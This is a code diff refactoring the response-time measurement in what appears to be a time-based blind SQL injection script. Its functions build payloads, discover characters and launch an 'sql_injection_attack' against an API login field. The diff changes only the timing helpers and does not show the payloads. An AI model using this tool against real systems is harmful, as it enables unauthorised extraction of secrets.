@@ -31,17 +31,18 @@ def build_sql_payload(condition):
 
 
 def measure_response_time(url, input):
+    start = time.perf_counter()
+    r = requests.post(f"{url}", data=input)
+    # print(f"Response: {r.text}")
+    end = time.perf_counter()
+    return end - start
+
+def measure_avg_response_time(url, input):
     request_times = []
     for run in range(API_RUNS):
-        start = time.perf_counter()
-        r = requests.post(f"{url}", data=input)
-        # print(f"Response: {r.text}")
-        end = time.perf_counter()
-        request_times.append(end - start)
-        # print(f"Run {run + 1}. Time: {request_times[run]} \n")
-    avg_reponse_time = median(request_times)
-    # print(f"Run Average Time: {avg_reponse_time} for input: {input} \n")
-    return avg_reponse_time
+        request_time = measure_response_time(url, input)
+        request_times.append(request_time)
+    return median(request_times)
 
 
 def discover_char(normal_reponse_time, key_index):
@@ -91,7 +92,7 @@ def chunk_verification(normal_reponse_time):
 def sql_injection_attack():
     print("\n🚀 Starting Measurement of API")
     normal_input = {"username": "admin"}
-    normal_reponse_time = measure_response_time(API_URL, normal_input)
+    normal_reponse_time = measure_avg_response_time(API_URL, normal_input)
 
     chunk_verification(normal_reponse_time)
 
